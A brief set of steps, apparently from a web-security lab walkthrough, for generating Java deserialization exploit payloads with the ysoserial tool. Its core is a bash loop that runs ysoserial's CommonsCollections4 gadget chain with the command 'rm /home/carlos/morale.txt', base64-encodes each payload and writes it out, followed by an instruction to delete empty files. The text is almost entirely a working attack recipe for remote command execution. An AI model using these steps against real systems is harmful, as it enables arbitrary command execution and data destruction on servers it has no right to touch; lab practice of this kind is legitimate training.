
first you will download ysoserial
then make dir and write bash script as  :
while read payloadname;do java -jar ../ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr -d '\n' >$payloadname ;done < ../yy
then delete size 0 
